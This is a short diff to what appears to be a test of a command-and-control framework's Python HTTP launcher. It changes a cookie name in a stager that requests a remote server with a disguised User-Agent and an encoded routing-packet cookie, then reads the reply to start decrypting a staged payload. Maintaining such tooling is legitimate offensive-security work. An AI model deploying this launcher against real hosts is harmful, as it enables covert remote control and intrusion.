@@ -266,7 +266,7 @@ def _expected_http_python_launcher():
         req=urllib.request.Request(server+t);
         proxy = urllib.request.ProxyHandler();
         o = urllib.request.build_opener(proxy);
-        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
+        o.addheaders=[('User-Agent',UA), ("Cookie", "l33th4x0r=cm91dGluZyBwYWNrZXQ=")];
         urllib.request.install_opener(o);
         a=urllib.request.urlopen(req).read();
         IV=a[0:4];
